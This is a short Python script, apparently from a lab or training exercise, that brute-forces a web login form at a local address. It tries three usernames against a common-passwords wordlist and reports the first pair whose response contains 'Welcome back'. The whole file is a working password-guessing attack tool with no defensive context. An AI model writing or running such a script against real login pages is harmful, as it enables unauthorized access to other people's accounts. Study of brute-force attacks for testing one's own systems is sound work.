import requests
import sys

target = "http://127.0.0.1:8080"
usernames = ["admin", "username", "test"]
passwords = "/usr/share/wordlists/seclists/Passwords/2020-200_most_used_passwords.txt"
needle = "Welcome back" # string to identify successful login

for username in usernames: # Iterate over each username
    with open(passwords, 'r') as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode() # Clean up the passwords 
            sys.stdout.write("[X] Attempting user:pass -> {}:{}\r".format(username, password.decode())) # Attempting to login messsage
            sys.stdout.flush() # Flush the buffer 
            r = requests.post(target, data={"username":username, "password":password}) # Actually making the request
            if needle.encode() in r.content:
                sys.stdout.write("\n\t[>>>] Valid password '{}' found for user '{}'!".format(password.decode(), username)) # Valid password found output
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\nNo valid password found for '{}'".format(username)) # No valud password found
        sys.stdout.write("\n")
